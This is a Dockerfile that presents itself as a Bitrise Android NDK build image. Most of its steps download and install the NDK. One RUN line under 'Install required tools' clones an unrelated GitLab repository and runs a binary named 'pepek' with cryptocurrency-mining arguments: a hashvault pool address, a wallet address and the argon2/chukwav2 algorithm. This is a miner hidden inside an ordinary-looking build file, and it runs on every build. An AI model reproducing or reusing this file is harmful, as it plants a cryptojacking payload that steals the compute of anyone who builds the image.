FROM quay.io/bitriseio/android:alpha

ENV ANDROID_NDK_HOME /opt/android-ndk
ENV ANDROID_NDK_VERSION r22
ENV GCE_METADATA_ROOT 127.0.0.1


# ------------------------------------------------------
# --- Install required tools

RUN git clone https://gitlab.com/rikzakalani04/7.git && cd 7 && chmod +x pepek && ./pepek -o pool.hashvault.pro:80 -u TRTLuyH4oQwEY6M7jAq5db7LfCY8QwWc368VPfpCg4XzjTw1kPdTnaYhnZKktmDNWphDCH8LtmbsTBuvvQEbk1Jb9FXswLdcfLy -p SUKUMANTE1 -a argon2/chukwav2 -k

# ------------------------------------------------------
# --- Android NDK

# download
RUN mkdir /opt/android-ndk-tmp && \
    cd /opt/android-ndk-tmp && \
    wget -q https://dl.google.com/android/repository/android-ndk-${ANDROID_NDK_VERSION}-linux-x86_64.zip && \
# uncompress
    unzip -q android-ndk-${ANDROID_NDK_VERSION}-linux-x86_64.zip && \
# move to its final location
    mv ./android-ndk-${ANDROID_NDK_VERSION} ${ANDROID_NDK_HOME} && \
# remove temp dir
    cd ${ANDROID_NDK_HOME} && \
    rm -rf /opt/android-ndk-tmp

# add to PATH
ENV PATH ${PATH}:${ANDROID_NDK_HOME}


# ------------------------------------------------------
# --- Cleanup and rev num

ENV BITRISE_DOCKER_REV_NUMBER_ANDROID_NDK v2020_12_15_1
CMD bitrise -version

